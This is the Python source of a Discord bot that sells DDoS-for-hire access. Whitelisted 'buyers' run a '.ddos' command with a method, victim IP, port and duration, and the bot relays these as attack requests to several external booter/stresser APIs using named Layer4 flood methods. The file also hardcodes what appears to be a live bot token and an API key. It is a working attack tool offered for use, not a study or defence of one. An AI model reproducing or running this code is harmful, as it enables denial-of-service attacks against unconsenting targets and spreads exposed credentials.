# Originally Made By
# https://www.github.com/XxB1a/ddos-discord-bot
# Revamped By Daffy <3
from discord.ext import commands     
from discord.ext.commands import Bot 
from os import system                
from os import name                  
from colorama import *               
import discord                       
import aiohttp                       
import random                        

buyers  = [932791297817858088, 950399051046744094, 950399051046744094, 950399051046744094]              # Replace digits with Discord USER-IDs!
admins  = [932791297817858088, 950399051046744094, 950399051046744094, 950399051046744094]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [932791297817858088, 950399051046744094, 950399051046744094, 950399051046744094]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = 'MTA1MDE5NjgwNTQ1NzAyMzA5Ng.G_Xwr2.pANRCjNxse1WCzjv-HYfznI0RBzF92S8q5DiIw'                  # Discord Bot token

intents = discord.Intents.default()
intents.messages = True
bot=commands.Bot(command_prefix=".",case_insensitive=True,intents=intents)
bot.remove_command("help")

l4methods = ['SMOKEY-HOME', 'SMOKEY-UDPBYPASS', 'SMOKEY-NFO', 'SMOKEY-OVHUDP', 'SMOKEY-TCPBYPASS', 'SMOKEY-OVHGAME' , 'SMOKEY-ROBLOX', 'SMOKEY-VSE', 'SMOKEY-GAME']            # Our Layer4 methods. Add more if desired!
l7methods = ['', '', ''] # Our Layer7 methods. Add more if desired!


api_data = [
    {
        'api_url':'https://api.smokeysecurity.com', # API URL #1
        'api_key':'HCW4NGNL0BSB171',              # API KEY #1
        'max_time':'120'                  # The max booting time for our bot. You need to change it, probably.
    },
    {
        'api_url':'https://api.stresser.gg', # API URL #1
        'api_key':'',               # API KEY #1
        'max_time':'200'                  # The max booting time for our bot. You need to change it, probably.
   },
    {
        'api_url':'https://stressednet.xyz/client/apimanagerv2.php?', # API URL #1
        'api_key':'',               # API KEY #1
        'max_time':'200'                    # The max booting time for our bot. You need to change it, probably.
    }
]

# This is our function to give embeds a random color!
# You can call it using 'await random_color()'
async def random_color():
    number_lol = random.randint(1, 999999)

    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))

    return number_lol

@bot.command()
async def help(ctx):
    embed = discord.Embed(title=f'Help Menu', color=await random_color())
    embed.add_field(name='__**Commands**__', value='''
>ddos |  Attack Command
>help |  Sends This Message
>add_admin | Adds Admin User
>add_buyer | Adds Client User
>del_admin | Deletes Admin User
>del_buyer | Deletes Client User
''', inline=False)
    embed.add_field(name='__**Usage**__', value='''
>ddos [METHOD] [IP] [PORT] [TIME]
>help [NO REQUIRED ARGUEMENTS]
>add_admin [ID]
>add_buyer [ID]
>del_admin [ID]
>del_buyer [ID]
''', inline=False)
    await ctx.send(embed=embed)
	
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Command Is Restricted To Admins Only')

    elif buyer in buyers:
        await ctx.send(f'{buyer} Already Has Given Permissions!')

    elif buyer is None:
        await ctx.send('No ID provided')

    else:
        buyers.append(buyer)
        await ctx.send(f'{buyer} Whitelisted!')

@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Command Is Restricted To Admins')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} Is Not A Valid Buyer!')

    elif buyer is None:
        await ctx.send('Please Give A Id To Whitelist!')

    else:
        buyers.remove(buyer)
        await ctx.send(f'Removed {buyer} Whitelist!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Command Requires Owner Privileges')

    elif admin in admins:
        await ctx.send(f'{admin} Already Has Given Permissions!')

    elif admin is None:
        await ctx.send('Please Give An Id To Whitelist!')

    else:
        admins.append(admin)
        await ctx.send(f'Added {admin} to Whitelist!')

@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Command Requires Owner Privileges')

    elif admin not in admins:
        await ctx.send(f'{admin} Is Not A Valid Admin')

    elif admin is None:
        await ctx.send('Please Provide An ID!')

    else:
        admins.remove(admin)
        await ctx.send(f'Removed {admin} Whitelist!')

@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers: 
        await ctx.send('Invalid Permissions: Not Whitelisted')

    else:
        if method is None or method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="HELP", description="UwU you're lost", color=await random_color())
            embed.add_field(name="Syntax:", value=".ddos <method> <target> <port> <time>")
            embed.add_field(name="L4 METHODS:", value=f"{l4methodstr}")
            embed.add_field(name="L7 METHODS:", value=f"{l7methodstr}")

            await ctx.send(embed=embed)

        # There was no method
        elif method is None:
            await ctx.send('You need a method!')
            
        # The method was invalid!
        elif method.upper() not in l4methods and method.upper() not in l7methods:
            await ctx.send(f'Invalid method!!')

        # There was no victim
        elif victim is None:
            await ctx.send('You need a target!')

        # There was no port
        elif port is None:
            await ctx.send('You need a port!')

        # There was no time
        elif time is None:
            await ctx.send('You need a time!')

        # Everything is correct!
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time2 = max_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.get(f'{api_url}/api/attack?secret={api_key}&host={victim}&port={port}&time={time2}&method={method.upper()}&username=TCPCEPTO')
                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')

                except Exception as e:
                    #print(e)
                    pass

            embed = discord.Embed(title="Attack Sent!!", description=f"Attack sent to {victim}:{port} for {time} seconds using {method}", color=await random_color())
            await ctx.send(embed=embed)

@bot.event
async def on_ready():
    banner = f"""
        {Fore.RED};) D{Fore.YELLOW}A{Fore.GREEN}F{Fore.CYAN}F{Fore.BLUE}Y{Fore.MAGENTA} <3 :-).



        {Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(banner)
    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))

if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
